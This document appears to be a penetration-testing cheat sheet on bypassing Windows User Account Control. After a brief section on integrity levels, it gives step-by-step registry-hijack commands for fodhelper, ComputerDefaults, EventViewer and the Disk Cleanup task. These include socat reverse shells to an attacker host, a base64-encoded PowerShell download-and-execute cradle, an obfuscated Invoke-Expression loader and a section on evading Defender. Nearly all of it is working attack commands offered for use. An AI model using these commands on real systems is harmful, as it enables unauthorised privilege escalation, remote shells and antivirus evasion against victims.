# User Account Control (UAC) Bypass

## Theory and examples

# INTEGRITY LEVELS (IL)

### Low = Generally used for interaction with the Internet. Has very limited permissions.

### Medium = Assigned to standard users and Administrators' filtered tokens.

### High = Used by Administrators' elevated tokens if UAC is disabled. All administrators will always use a high IL token.

### System = Reserved for system use.

# FILTERED TOKENS

### Non-administrators: Will receive a single access token when logged in, which will be used for all tasks performed by the user. This token has Medium IL.

### Administrators: Filtered token = A token with Administrator privileges stripped, used for regular operations. This token has Medium IL.

### Elevated Token = Full admin privileges. High IL.

# EventViewer

Link: https://github.com/CsEnox/EventViewer-UACBypass

### 1) Upload and import the module

     Import-Module .\Invoke-EventViewer.ps1

### 2) Run it

     Invoke-EventViewer cmd.exe

# ComputerDefaults

### 1) 

     New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force

### 2) 

     New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force

### 3) 

     Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c curl http://192.168.50.149/worked" -Force

### 4) 

     Start-Process "C:\Windows\System32\ComputerDefaults.exe"

# Obfuscated UAC Bypass

Link: https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/UAC-Bypass.md

### 1) Prepare the command to be executed

     $ipAddress = (ip addr show tun0 | grep inet | head -n 1 | cut -d ' ' -f 6 | cut -d '/' -f 1)
     $text = "(New-Object System.Net.WebClient).DownloadString('http://$ipAddress/run3.txt') | IEX"
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
     $EncodedText = [Convert]::ToBase64String($bytes)
     $EncodedText
     exit

### 2) Encode your command

     (New-Object System.Net.WebClient).DownloadString('http://[ATTACKER_IP]/run3.txt') | IEX
     echo -en '(New-Object System.Net.WebClient).DownloadString("http://[ATTACKER_IP]/run3.txt") | IEX' | iconv -t UTF-16LE | base64 -w 0

### 3) Insert the Base64 blob into the code variable 

     # The result from the previous command
     $code = "KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA3AC8AcgB1AG4AMwAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA="

### 4) Create the Bypass function

     function Bypass {
     [CmdletBinding()]
     param (
     [Parameter (Position=0, Mandatory = $True)]
     [string]$code )
     
     (nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9l3f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
     }

### 5) Execute the code

     Bypass $code

# GUI-BASED UAC BYPASS

## msconfig

#### 1) Run 

#### 2) msconfig

#### 3) System Configuration -> Tools

#### 4) Launch cmd.exe

## azman.msc

#### 1) Run

#### 2) azman.msc

#### 3) Authorization Manager -> Help -> Help Topics

#### 4) Right-click -> View Source (Spawns notepad process)

#### 5) File -> Open

#### 6) All files

#### 7) Search cmd.exe

#### 8) Open cmd.exe

# AUTOMATION

### Tool: UACMEAkagi64.exe

#### options: 

#### 33 = fodhelper.exe

#### 34 Disk Cleanup scheduled Task

#### 70 fodhelper.exe using CurVer registry key

# AUTO-ELEVATE

### Verification

     sigcheck64.exe -m c:\path\to\file.exe

# FODHELPER

#### 1) 

    whoami

#### 2) 

    net user USER | find "Local Group"

#### 3) 

    whoami /groups | find "Label"

#### 4) 

    set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

#### 5) 

    set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"

#### 6) 

    reg add %REG_KEY% /v "DelegateExecute" /d "" /f

#### 7) 

    reg add %REG_KEY% /d %CMD% /f

#### 8) Attacker: 

    nc -lvp PORT 

#### 9) 

    fodhelper.exe

#### 10) 

    reg delete HKCU\Software\Classes\ms-settings\ /f (Cleanup)

# BYPASS DEFENDER WITH FODHELPER

#### 1) 

    set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

#### 2) 

    set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"

#### 3) 

    reg add %REG_KEY% /v "DelegateExecute" /d "" /f

#### 4) 

    reg add %REG_KEY% /d %CMD% /f & fodhelper.exe

#### 5) 

    nc -lvnp PORT 

# IMPROVED FODHELPER EXPLOIT

#### 1) 

    set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"

#### 2) 

    reg add "HKCU\Software\Classes\.jim\Shell\Open\command" /d %CMD% /f

#### 3) 

    reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".jim" /f

#### 4) 

    fodhelper.exe

#### 5) 

    nc -lvp PORT

#### 6) 

    reg delete "HKCU\Software\Classes\.jim\" /f (Cleanup)

    reg delete "HKCU\Software\Classes\ms-settings" /f (Cleanup)

# DISK CLEANUP SCHEDULED TASK

#### 1) 

    nc -lvp PORT 

#### 2) 

    reg add "HKCU\Environment" /v "windir" /d "cmd.exe -c c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes &REM " /f

#### 3) 

    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

#### 4) 

    reg delete "HKCU\Environment" /v "windir" /f (Cleanup)
